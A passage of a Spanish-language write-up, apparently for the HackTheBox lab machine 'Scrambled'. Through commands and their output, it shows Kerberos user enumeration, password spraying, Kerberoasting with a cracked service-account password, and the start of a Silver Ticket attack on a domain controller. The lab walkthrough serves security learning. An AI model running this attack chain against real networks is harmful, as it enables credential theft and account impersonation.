SF:V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Fo
SF:urOhFourRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMM
SF:AND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNO
SF:WN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">
SF:"</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,3
SF:5,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LAND
SF:esk-RC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,1D,<span class="s2">"SCR
SF:AMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NCP,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3
SF:;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>JavaRMI,1D
SF:,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,1D,<span class="s2">"SCRAMBLECORP_ORD
SF:ERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>ms-sql-s,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>giop,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\</span><span class="s2">
SF:n"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-30T00:28:22
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-4s</span>, deviation: 0s, median: <span class="nt">-4s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>De primeras no vemos nada de información relevante sobre la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Como la maquina tiene muchos puertos abiertos podemos probar con otro protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.11.168
LDAP        10.10.11.168    389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local
</code></pre></div></div>

<ul>
  <li>Al parecer tenemos limitaciones para enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.168 <span class="nt">--shares</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.168 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.168
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
</code></pre></div></div>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto a si que podemos ver su contenido y si encontramos algo interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Scramble</span> <span class="no">Corp</span> <span class="no">Intranet</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/1.png" />
</p>

<ul>
  <li>
    <p>En la parte de <code class="language-plaintext highlighter-rouge">IT Services</code> encontramos lo siguiente.</p>
  </li>
  <li>
    <p>Nos dicen que debido a la brecha de seguridad que hubo el mes pasado deshabilitaron la autenticación NTLM pero dice que seamos pacientes mientras trabajan en resolverlo.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/2.png" />
</p>

<ul>
  <li>Tenemos <code class="language-plaintext highlighter-rouge">Resources</code> interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/3.png" />
</p>

<ul>
  <li>Probando en <code class="language-plaintext highlighter-rouge">New User Account</code> no funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/4.png" />
</p>

<ul>
  <li>Pero en <strong>Contacting IT Support</strong> vemos un nombre de usuario que es <code class="language-plaintext highlighter-rouge">ksimpson</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/5.png" />
</p>

<ul>
  <li>Podemos usa <code class="language-plaintext highlighter-rouge">kerbrute</code> para verificar que sea un usuario del dominio pero como no sabemos si existan mas usuarios podemos usar un diccionario <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt">https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt</a> para enumerar mas usuarios en caso de que los allá.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> DC1.scrm.local /opt/A-ZSurnames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 18:53:06 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 18:53:06 <span class="o">&gt;</span>  	DC1.scrm.local:88

2024/04/29 18:53:06 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ASMITH@scrm.local
2024/04/29 18:53:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JHALL@scrm.local
2024/04/29 18:53:48 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KSIMPSON@scrm.local
2024/04/29 18:53:51 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KHICKS@scrm.local
2024/04/29 18:54:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 SJENKINS@scrm.local
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
asmith
jhall
ksimpson
khicks
sjenkins
</code></pre></div></div>

<ul>
  <li>Si recordamos no tenemos la autenticación <code class="language-plaintext highlighter-rouge">NTLM</code> activada pero podemos probar solicitar un <code class="language-plaintext highlighter-rouge">TGT</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers scrm.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User asmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User ksimpson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User sjenkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que podemos hacer es ver si algún usuario usa su nombre de usuario como su contraseña esto casi siempre suele pasar podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> y <code class="language-plaintext highlighter-rouge">kerbrute</code> para este proceso.</p>
  </li>
  <li>
    <p>Lo hacemos con otro protocolo por que <code class="language-plaintext highlighter-rouge">smb</code> no funciona y de los que tiene contemplado <code class="language-plaintext highlighter-rouge">crackmapexec</code> <code class="language-plaintext highlighter-rouge">ldap</code> si funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme ldap scrm.local <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">-k</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\a</span>smith:asmith KDC_ERR_PREAUTH_FAILED
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\j</span>hall:jhall KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>+] scrm.local<span class="se">\k</span>simpson
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\k</span>hicks:khicks KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\s</span>jenkins:sjenkins KDC_ERR_PREAUTH_FAILED
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">ksimson</code> usa como contraseña su nombre de usuario también podemos validarlo con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 bruteuser <span class="nt">--dc</span> 10.10.11.168 <span class="nt">-d</span> scrm.local users.txt ksimpson

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 19:04:36 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 19:04:36 <span class="o">&gt;</span>  	10.10.11.168:88

2024/04/29 19:04:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2024/04/29 19:04:36 <span class="o">&gt;</span>  Done! Tested 5 logins <span class="o">(</span>1 successes<span class="o">)</span> <span class="k">in </span>0.400 seconds
</code></pre></div></div>

<h2 id="shell-as-sqlsvc">Shell as SQLSvc</h2>

<ul>
  <li>Como tenemos credenciales podemos probar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> pero con el parámetro <code class="language-plaintext highlighter-rouge">-k</code> ya que tenemos la atención <code class="language-plaintext highlighter-rouge">NTLM</code> deshabilitada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>Aun así obtenemos un error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en internet errores al operar con <code class="language-plaintext highlighter-rouge">-k</code> encontramos lo siguiente <a href="https://github.com/fortra/impacket/issues/1206">https://github.com/fortra/impacket/issues/1206</a>.</p>
  </li>
  <li>
    <p>Pero tenemos que cambiar una parte del código en esta parte.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/6.png" />
</p>

<ul>
  <li>Tenemos que cambiarla por esta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/7.png" />
</p>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc<span class="k">*</span><span class="nv">$0404e156f2b44fdc2ccabae35e43d08d$eb31843c7e1cb948d143812b4a93c13e6241e8865b6a807e64c59acd7fdd841f438222bcfb364667dc59bfccc085c29405ca00b652b0b9a90d6c5647a9a3b2d9fdd119d4c85a2fcf490a0340b1649bdb55302cfecdf2bfbd18c6eee115c9e81c27869b976fc589b027e3128dece13b86bc4b8b7b659c733caa0f5a212e4917ff3b6584d52b8597599e9096da96cb2e4904bc848ff4972fee71188c948875c93c6d9aa493c8b02a115db904970717d2704368c1e6a364e6f1c7ba5d5524e9d7d8a11217c707c7a0c040d2b7aca2cc11113aafdcc22d0c3a01ec6f00d3424a959cdaf1adcb2295cf30aeac9cd3e8e96bb85497262171d4718ab7cf20f7b57d64de5e9f645871fbef03f763cb2256c8765d6eae6db3d8cee1109dfb530a782e472bd6b84b7622e91956544f521f76c66399d58b1e892a945316b7f88007c58f49e91f1dd7a7e96a1ed0d1652d16d896150f1e1799f5b733fcec1c3d3c7619892cf6ba0da6cb5239af4be492e3d082fa899eb4abe657a24bf908ff366e8a3c06a2b2462f35f793e690d92091ef264b7a7f440bd2660f42fabf1cef538d7e276825fabdf740859a3621efb81f25ca525ae8763e20d9907b1c37b37cc44bb186a5c39adc5f7d6bbb1f0255bfc9f716f34e2e6079549be7ff3a104ce3c2ecaddabaf0122b7394660c98ec32579f696a1ae20223ae2fd5a5ccebc258413fd6785374bbd6b4b2f40872aaa1e03cd621fdd7bc0860ac1498c26c8c7e82f6c16faeb70908c23bbc1b5ae03c62b55445e781c960ccc5b412320cd8cd0bc3d779a346a9c3940b5f1c3bc7ab8c31efc1d73ac4575c06a0337a03da926bc3a4d86accabd34c95a64569e0b6d089f15db63901de7dd308b9d1e76f7989b48f9f97c600dcaf6dfc3d0372c64b354bb5869f20e034ae1e5ab1a77e9e536351496290eac31e127fe015045c9e1e9a7d82d021b42eaa1773bf3bf87e9b0e52f4758013f7ef4c6cea2998f93c903f2120e09698910fa170dbcfac23920a7551a77285642046fabadb0bf1e822c169846e6d583053c8f9cee5e3775a784e6bd3e55323befa1bf9859a1036e659bb932f75296d14f33e047ced0731d7daf25c20f94c94604e709b5b9307c36f38e81211f7248eb6a05f19dbb78c754e7aa128984aa3eaba2a2c16d2c3fae396c8459c152150e467d06782669c70ada40d5b67361a198d1c945be215402b81b6f43dbfa9b3a12d20b804f9b51bb61568e14793687d8b33d51ed9da783403ebe4b20930b05ee92e44f1046158a01f2c871cf8a118a89b01d168e1fcd936f19101c115d69b1d5ca6ed2cc9acc95c23690287f4e9852b7f5d6af97c92cd5ee2ff82b4e8f32724809394976a75ea91c15c48da114419cca7499b3aeda0a71ff6067e78893d8e8f37941226928c00fa1684cf41fb7bbd30af815213f5</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo con <code class="language-plaintext highlighter-rouge">john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Pegasus60        <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:13 DONE <span class="o">(</span>2024-04-29 19:56<span class="o">)</span> 0.07547g/s 809771p/s 809771c/s 809771C/s Peguero..Pearce
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> para conectarnos.</p>
  </li>
  <li>
    <p>Pero obtenemos un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Tenemos que usar <code class="language-plaintext highlighter-rouge">kerberos</code> pero necesitamos un <code class="language-plaintext highlighter-rouge">TGT</code> para poder autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Pero aun así no podemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a probar con el otro usuario.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>ksimpson.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\ksimpson'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos el <code class="language-plaintext highlighter-rouge">SPN</code> podemos hacer un <code class="language-plaintext highlighter-rouge">Silver Ticket Attack</code> para suplantar un usuario.</p>
  </li>
  <li>
    <p>Pero antes podemos probar enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use Public</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 <span class="nb">.</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
<span class="nt">-rw-rw-rw-</span>     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
<span class="c"># get Network Security Changes.pdf</span>
</code></pre></div></div>

<ul>
  <li>Al abrirlo ya vimos por que no podemos conectarnos al parecer solo los administradores pueden.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/8.png" />
</p>

<ul>
  <li>Bueno vamos a suplantar la identidad del usuario administrador para hacer esto necesitamos el <code class="language-plaintext highlighter-rouge">Domain SID</code> del dominio para generar un <code class="language-plaintext highlighter-rouge">TGS</code> bajo el usuario administrador <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getPac scrm.local/ksimpson:ksimpson <span class="nt">-targetUser</span> Administrator | <span class="nb">grep </span>Domain
LogonDomainName:                 <span class="s1">'SCRM'</span>
